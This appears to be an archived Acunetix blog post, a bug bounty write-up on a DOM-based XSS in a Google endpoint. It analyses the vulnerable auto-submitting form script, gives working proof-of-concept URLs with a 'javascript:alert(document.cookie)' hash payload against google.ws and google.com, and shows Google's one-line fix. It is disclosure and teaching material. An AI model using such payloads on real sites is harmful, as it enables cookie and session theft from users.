---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-02-17_how-we-found-another-xss-in-google-with-acunetix.md
original_filename: 2020-02-17_how-we-found-another-xss-in-google-with-acunetix.md
title: How We Found Another XSS in Google with Acunetix
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: c3257cb800914ef932b69cbef4fd933b7f1615881ea72bcf7d07143e0c9dd78c
text_sha256: 65492cd66792be36968150c75bc98ac4458917f40a46835bdbd9a07e2c934eab
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# How We Found Another XSS in Google with Acunetix

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-02-17_how-we-found-another-xss-in-google-with-acunetix.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `c3257cb800914ef932b69cbef4fd933b7f1615881ea72bcf7d07143e0c9dd78c`
- Text SHA256: `65492cd66792be36968150c75bc98ac4458917f40a46835bdbd9a07e2c934eab`


## Content

---
title: "How We Found Another XSS in Google with Acunetix"
page_title: "How We Found Another XSS in Google with Acunetix | Acunetix"
url: "https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/"
final_url: "https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/"
authors: ["Andrey Leonov (@4lemon)"]
programs: ["Google"]
bugs: ["XSS"]
bounty: "5,000"
publication_date: "2020-02-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4766
---

![Andrey Leonov](https://cdn.acunetix.com/wp-content/uploads/2019/12/11110957/leonov-150x150.jpg) [Andrey Leonov](https://www.acunetix.com/blog/author/4lemon/ "View all posts by Andrey Leonov") | February 17, 2020  

![](https://cdn.acunetix.com/wp-content/uploads/2020/02/05085243/xss.png)

You have to be a very lazy hacker not to try to find issues in Google. [Link](https://hackerone.com/linkks) and I are not lazy but we may be a bit luckier than most. And we use good tools, which helps. Some time ago, [we found an XSS in Google Cloud with the help of the Acunetix vulnerability scanner](https://www.acunetix.com/blog/web-security-zone/google-xss-found-using-acunetix/). Recently we found another XSS vulnerability. Here is how it happened.

## Step 1. A Report from the Vulnerability Scanner

As part of our research, we regularly scan various Google services using different tools, including Acunetix. We simply have a long list of targets and go through each of them. One of such target scans in December 2019 resulted in the scanner reporting an XSS with the following payload:
  
  
  https://google.ws/ajax/pi/fbfr?wvstest=javascript:domxssExecutionSink(1,%22%27%5C%22%3E%3Cxsstag%3E()locxss%22)
  

Such reports sometimes turn out to be false positives and we don’t react to them every time but this was Google. So it was very much worth having a deeper look.

## Step 2. Analyzing the HTTP Response

The first step was to examine the HTTP response in detail:
  
  
  HTTP/1.1 200 OK
  ...
  <!doctype html><div style="display:none"> <form method="post"> </form> <script nonce="+ao+4Egc+7YExl3qyyWMJg==">(function(){var a=window.document.forms[0],b=location.hash.substr(1);b||window.close();var c=b.split("&"),d=decodeURIComponent(c[0]);a.action=d;for(var e=1;e<c.length;e++){var f=c[e].split("="),g=document.createElement("input");g.type="hidden";g.name=f[0];g.value=decodeURIComponent(f[1]);a.appendChild(g)}a.submit();}).call(this);</script> </div>
  

This response seemed to contain an empty form and a bit of JavaScript code. To understand it better, we made it more readable:
  
  
  (function() {
      var a = window.document.forms[0],
          b = location.hash.substr(1);
      b || window.close();
      var c = b.split("&"),
          d = decodeURIComponent(c[0]);
      a.action = d;
      for (var e = 1; e < c.length; e++) {
          var f = c[e].split("="),
              g = document.createElement("input");
          g.type = "hidden";
          g.name = f[0];
          g.value = decodeURIComponent(f[1]);
          a.appendChild(g)
      }
      a.submit();
  }).call(this);
  

Next, we tried to understand every step of the above JavaScript code. See the comments within the code to understand how it works.
  
  
  (function() {
  // Function that is going to be auto-executed 
  }).call(this);
  
  
  
  (function() {
    // The variable “a” points to a form that is empty right now
      var a = window.document.forms[0],
      // The variable b is a location hash without the # character
          b = location.hash.substr(1);
    // If there is no b (no hash in the location URI), try to self-close
      b || window.close();
    // Split the location hash using the & character
      var c = b.split("&"),
      // And decode the first (zero) element
          d = decodeURIComponent(c[0]);
    // The hash value becomes the action of the form
      a.action = d;
  // The below content is not important in the context of the issue
      for (var e = 1; e < c.length; e++) {
          var f = c[e].split("="),
              g = document.createElement("input");
          g.type = "hidden";
          g.name = f[0];
          g.value = decodeURIComponent(f[1]);
          a.appendChild(g)
      }
  **// The form is auto-submitted**
      a.submit();
  }).call(this);
  

## Step 3. The Proper Payload

Once we understood how the function works, all we needed is a proper payload. We came up with the following one:
  
  
  https://google.ws/ajax/pi/fbfr#javascript:alert(document.cookie)
  

![](https://cdn.acunetix.com/wp_content/uploads/2020/02/image1.png)

We also decided to see if this vulnerability affects other Google domains:
  
  
  https://google.com/ajax/pi/fbfr#javascript:alert(document.cookie)
  

![](https://cdn.acunetix.com/wp_content/uploads/2020/02/image2.png)

## The Fix

Google did not have to work hard on fixing the issue. Only one line of code had to be changed to eliminate the vulnerability:
  
  
  (function() {
      var a = window.document.forms[0],
          b = location.hash.substr(1);
      b || window.close();
      var c = b.split("&"),
          d = decodeURIComponent(c[0]);
  **// Only the below line needed to be changed**
  **// to check if the location hash begins with http:**
  0 != d.indexOf("http") && window.close();
      a.action = d;
      for (var e = 1; e < c.length; e++) {
          var f = c[e].split("="),
              g = document.createElement("input");
          g.type = "hidden";
          g.name = f[0];
          g.value = decodeURIComponent(f[1]);
          a.appendChild(g)
      }
      a.submit();
  }).call(this);
  

## The Timeline

  * Vulnerability reported: Dec 27, 2019, 01:01 AM
  * Vulnerability triaged: Dec 27, 2019, 08:32 PM
  * Issue fixed by Google: Jan 8, 2020
  * Bounty paid: Jan 8, 2020
  * Bounty amount: USD 5000

Get the latest content on web security  
in your inbox each week.

We respect your [privacy](//www.acunetix.com/company/privacy)

##### SHARE THIS POST

###### THE AUTHOR

![Andrey Leonov](https://cdn.acunetix.com/wp-content/uploads/2019/12/11110957/leonov-150x150.jpg)

**Andrey Leonov**  
Independent Security Researcher  

[Andrey Leonov (4lemon)](https://4lemon.ru/) is an independent web application security researcher and an Acunetix fan. He often works together on security research with his colleague, [Link](https://hackerone.com/linkks).

### Related Posts:

  * [![xss featured](https://cdn.acunetix.com/wp-content/uploads/2018/11/11111058/dom-based-xss-featured.png)How I Found an XSS in Google using Acunetix](https://www.acunetix.com/blog/web-security-zone/google-xss-found-using-acunetix/)[Read more ]()
  * [![Google XSS](https://cdn.acunetix.com/wp-content/uploads/2019/04/11110646/image2.png)Mutation XSS in Google Search](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)[Read more ]()
  * [![FeedBurner-icon](https://cdn.acunetix.com/wp-content/uploads/2015/09/11105543/FeedBurner-icon.png)XSS in Google Feedburner](https://www.acunetix.com/blog/articles/xss-in-google-feedburner/)[Read more ]()
